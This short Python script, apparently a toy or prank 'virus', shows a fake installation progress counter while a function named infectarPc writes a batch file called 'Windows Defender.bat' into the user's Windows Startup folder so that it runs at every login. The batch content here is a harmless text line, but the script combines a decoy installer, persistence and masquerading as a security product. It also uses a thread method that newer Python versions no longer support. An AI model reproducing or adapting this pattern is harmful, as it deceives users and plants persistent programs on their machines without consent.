import time
import os
import threading


def msgInstalacao():
    print("Instalando..")

    time.sleep(2)

    for x in range(0, 101):
        os.system('cls')
        print(str(x) + "%")
        time.sleep(.500)

def criarBatInicializacao():
        with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows Defender.bat", "w") as arq:
                arq.write("Oi sumida rsrs")
                arq.write("\n")
                arq.close()

def navegarPastas():
        dir = os.path.dirname(os.path.realpath(__file__))
        print(dir)

def infectarPc():
        criarBatInicializacao()
        navegarPastas()

t = threading.Thread(target=msgInstalacao)
t.start()

if t.isAlive():
    infectarPc()



